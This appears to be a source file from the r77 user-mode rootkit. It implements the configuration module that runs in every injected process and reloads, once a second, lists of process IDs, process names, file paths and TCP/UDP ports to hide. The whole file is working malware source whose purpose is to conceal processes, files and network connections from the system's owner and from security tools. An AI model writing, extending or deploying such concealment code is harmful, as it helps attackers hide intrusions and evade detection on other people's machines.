#include "r77.h"

HANDLE Config::Thread = NULL;
PR77_CONFIG Config::Configuration = NULL;

void Config::Initialize()
{
	// The configuration is read periodically in a background thread.
	if (!Thread)
	{
		Thread = CreateThread(NULL, 0, UpdateThread, NULL, 0, NULL);
	}
}
void Config::Shutdown()
{
	if (Thread)
	{
		TerminateThread(Thread, 0);
		Thread = NULL;
	}
}

bool Config::IsProcessIdHidden(DWORD processId)
{
	if (Configuration)
	{
		for (DWORD i = 0; i < Configuration->HiddenProcessIdCount; i++)
		{
			if (Configuration->HiddenProcessIds[i] == processId)
			{
				return true;
			}
		}
	}

	return false;
}
bool Config::IsProcessNameHidden(LPCWSTR processName)
{
	if (Configuration && processName)
	{
		for (DWORD i = 0; i < Configuration->HiddenProcessNameCount; i++)
		{
			if (!lstrcmpiW(Configuration->HiddenProcessNames[i], processName))
			{
				return true;
			}
		}
	}

	return false;
}
bool Config::IsProcessNameHidden(UNICODE_STRING processName)
{
	PWCHAR chars = ConvertUnicodeStringToString(processName);
	if (chars)
	{
		bool result = IsProcessNameHidden(chars);
		delete[] chars;
		return result;
	}
	else
	{
		return false;
	}
}
bool Config::IsPathHidden(LPCWSTR path)
{
	if (Configuration && path)
	{
		for (DWORD i = 0; i < Configuration->HiddenPathCount; i++)
		{
			if (!lstrcmpiW(Configuration->HiddenPaths[i], path))
			{
				return true;
			}
		}
	}

	return false;
}
bool Config::IsTcpLocalPortHidden(USHORT port)
{
	if (Configuration)
	{
		for (DWORD i = 0; i < Configuration->HiddenTcpLocalPortCount; i++)
		{
			if (Configuration->HiddenTcpLocalPorts[i] == port)
			{
				return true;
			}
		}
	}

	return false;
}
bool Config::IsTcpRemotePortHidden(USHORT port)
{
	if (Configuration)
	{
		for (DWORD i = 0; i < Configuration->HiddenTcpRemotePortCount; i++)
		{
			if (Configuration->HiddenTcpRemotePorts[i] == port)
			{
				return true;
			}
		}
	}

	return false;
}
bool Config::IsUdpPortHidden(USHORT port)
{
	if (Configuration)
	{
		for (DWORD i = 0; i < Configuration->HiddenUdpPortCount; i++)
		{
			if (Configuration->HiddenUdpPorts[i] == port)
			{
				return true;
			}
		}
	}

	return false;
}

DWORD WINAPI Config::UpdateThread(LPVOID parameter)
{
	Configuration = LoadR77Config();

	while (true)
	{
		// Interval should not be too small, because this thread is running in every injected process.
		Sleep(1000);

		PR77_CONFIG newConfiguration = LoadR77Config();

		if (CompareR77Config(Configuration, newConfiguration))
		{
			// Configuration hasn't changed.
			DeleteR77Config(newConfiguration);
		}
		else
		{
			// Store configuration only if it has changed to avoid threading errors.
			DeleteR77Config(Configuration);
			Configuration = newConfiguration;
		}
	}

	return 0;
}